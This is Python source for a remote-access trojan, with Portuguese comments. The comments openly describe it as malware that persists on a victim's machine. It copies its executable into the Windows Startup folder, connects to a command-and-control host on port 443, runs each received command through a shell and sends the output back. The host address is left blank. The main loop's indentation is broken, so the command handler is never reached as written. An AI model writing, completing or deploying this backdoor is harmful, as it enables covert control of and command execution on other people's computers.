import socket
import subprocess
import threading
import time 
import os

CCIP = ""
#Porta de segurança do HTTP
CCPORT = 443

#função para persistir o trojan, ter o acesso da maquina da vitima mesmo desligada
def autorun():
    #Caminho do OS
    filen = os.path.basename(__file__)
    exe_file = filen.replace('py', '.exe')
    #print(exe_file)
    
    #caminho para onde o exe vai
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(exe_file))

#Receber a data do cliente
def cmd(client, data):
    #Pegando todas as conexões, para dar acesso a subcomandos do windows
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        #dando a leitura do erro e tratando
        output = proc.stdout.read() + proc.stderr.read()
        #Conexão com o cliente e vai mandar o comando para o servidor e do servidor para o cliente
        client.send(output + b"\n")
    except Exception as error:
        print(error)
        
def conn(CCIP, CCPORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((CCIP, CCPORT))
        return client
    except Exception as error:
        print(error)
        
#função que verifica se a conexão esta ativa
def cli(cliente):
    try:
        while True:
            data = cliente.recv(1024).decode().strip()
            if data == "/:kill":
                return
            else:
                threading.Thread(target=cmd, args=(cliente, data)).start()
    except Exception as error:
        cliente.close()
        
if __name__ == "__main__":
    autorun()
    while True:
        cliente = conn(CCIP, CCPORT)
    if cliente:
        #Se o cliente for igual a função cli, vai abrir a função
        if cliente:
            cli(cliente)
        else:
            time.sleep(3)